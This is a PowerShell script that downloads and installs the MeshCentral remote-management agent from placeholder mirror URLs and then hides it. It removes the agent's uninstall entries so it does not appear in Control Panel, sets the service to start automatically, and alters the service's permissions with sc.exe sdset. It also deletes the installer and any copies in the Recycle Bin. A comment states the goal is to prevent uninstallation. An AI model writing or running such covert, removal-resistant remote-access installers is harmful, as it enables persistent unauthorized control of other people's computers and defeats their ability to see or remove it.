# MeshCentral Agent Installer Script

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$URLs = @(
    'https://yourmirror1.com/meshagent.exe',
    'https://yourmirror2.com/meshagent.exe',
    'https://yourmirror3.com/meshagent.exe'
)

$exePath = "$env:TEMP\meshagent.exe"

foreach ($URL in $URLs | Sort-Object { Get-Random }) {
    try {
        Invoke-WebRequest -Uri $URL -OutFile $exePath -UseBasicParsing
        break
    } catch {}
}

if (-not (Test-Path $exePath)) {
    Write-Host "Failed to download Mesh Agent." -ForegroundColor Red
    throw
}

# Install the agent
Start-Process -FilePath $exePath -ArgumentList "-fullinstall" -Wait

# Remove the downloaded exe from temp folder
Remove-Item $exePath -Force

# Prevent MeshCentral from being uninstalled by hiding from Control Panel/Settings
$uninstallKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\MeshCentral'
if (Test-Path $uninstallKey) {
    Remove-ItemProperty -Path $uninstallKey -Name 'DisplayName' -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $uninstallKey -Name 'UninstallString' -ErrorAction SilentlyContinue
}

$service = Get-Service "Mesh Agent" -ErrorAction SilentlyContinue
if ($service) {
    Set-Service -Name $service.Name -StartupType Automatic
    sc.exe sdset $service.Name D:(A;;CCLCSWLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
}

$recycleBinPath = [System.IO.Path]::Combine($env:SystemDrive, '\$Recycle.Bin')
$filesInBin = Get-ChildItem -Path $recycleBinPath -Recurse -Filter 'meshagent.exe' -ErrorAction SilentlyContinue
foreach ($file in $filesInBin) {
    Remove-Item -Path $file.FullName -Force
}
